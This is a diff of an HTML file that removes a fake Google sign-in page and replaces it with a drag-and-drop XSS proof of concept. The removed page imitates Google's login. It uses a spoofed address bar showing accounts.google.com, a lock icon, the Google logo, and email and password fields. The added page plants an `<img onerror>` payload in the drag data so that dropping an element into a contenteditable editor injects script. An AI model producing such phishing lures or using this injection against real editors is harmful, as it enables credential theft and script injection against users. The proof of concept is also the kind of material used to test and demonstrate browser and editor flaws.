@@ -1,119 +1,45 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>Fake Google Login</title>
+  <title>Drag & Drop XSS PoC</title>
   <style>
-    body {
-      margin: 0;
-      background: #fff;
-      font-family: Arial, sans-serif;
+    body { font-family: Arial, sans-serif; margin: 20px; }
+    #dragme {
+      width: 150px; padding: 10px;
+      background: #4caf50; color: white;
+      cursor: grab; user-select: none;
     }
-
-    /* Fake Address Bar */
-    .address-bar {
-      display: flex;
-      align-items: center;
-      padding: 6px 12px;
-      background: #f1f3f4;
-      border-bottom: 1px solid #dcdcdc;
-      font-size: 14px;
-    }
-    .lock {
-      color: #34a853;
-      font-size: 14px;
-      margin-right: 8px;
-    }
-    .url {
-      color: #202124;
-      font-size: 14px;
-    }
-    .domain {
-      color: black;
-      font-weight: bold;
-    }
-
-    /* Center login box */
-    .container {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 90vh;
-    }
-
-    .login-box {
-      border: 1px solid #dadce0;
-      border-radius: 8px;
-      padding: 40px;
-      max-width: 360px;
-      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-    }
-
-    .login-box img {
-      display: block;
-      margin: 0 auto 20px;
-      width: 75px;
-    }
-
-    .login-box h1 {
-      font-size: 22px;
-      text-align: center;
-      font-weight: 400;
-      margin-bottom: 25px;
-    }
-
-    .input {
-      width: 100%;
+    #editor {
+      width: 90%; height: 200px;
+      border: 2px dashed #aaa; margin-top: 40px;
       padding: 10px;
-      margin: 8px 0;
-      border: 1px solid #dadce0;
-      border-radius: 4px;
-      font-size: 14px;
-    }
-
-    .btn {
-      width: 100%;
-      padding: 10px;
-      background: #1a73e8;
-      border: none;
-      color: white;
-      font-weight: bold;
-      font-size: 14px;
-      border-radius: 4px;
-      margin-top: 15px;
-      cursor: pointer;
-    }
-    .btn:hover {
-      background: #1669c1;
-    }
-
-    .link {
-      display: block;
-      margin-top: 15px;
-      font-size: 12px;
-      text-align: center;
-      color: #1a73e8;
-      text-decoration: none;
     }
   </style>
 </head>
 <body>
-  <!-- Fake Address Bar -->
-  <div class="address-bar">
-    <span class="lock">🔒</span>
-    <span class="url">https://<span class="domain">accounts.google.com</span>/signin/v2/identifier</span>
+  <h2>Copy–Drag–Drop XSS Demo</h2>
+  <p>👉 Drag kotak hijau ini dan drop ke editor di bawah</p>
+
+  <div id="dragme" draggable="true">Drag Me</div>
+
+  <h3>Target WYSIWYG (contenteditable)</h3>
+  <div id="editor" contenteditable="true">
+    Drop here...
   </div>
 
-  <!-- Fake Google Login -->
-  <div class="container">
-    <div class="login-box">
-      <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google Logo">
-      <h1>Sign in</h1>
-      <input type="text" class="input" placeholder="Email or phone">
-      <input type="password" class="input" placeholder="Enter your password">
-      <button class="btn">Next</button>
-      <a href="#" class="link">Forgot email?</a>
-    </div>
-  </div>
+  <script>
+    // Override data waktu drag
+    let dragme = document.getElementById("dragme");
+    dragme.addEventListener("dragstart", e => {
+      // payload XSS
+      let payload = `<img src=x onerror=alert('XSS via Drag&Drop')>`;
+      e.dataTransfer.setData("text/html", payload);
+      e.dataTransfer.setData("text/plain", payload);
+    });
+
+    // Optional: highlight editor saat dragover
+    let editor = document.getElementById("editor");
+    editor.addEventListener("dragover", e => e.preventDefault());
+  </script>
 </body>
 </html>
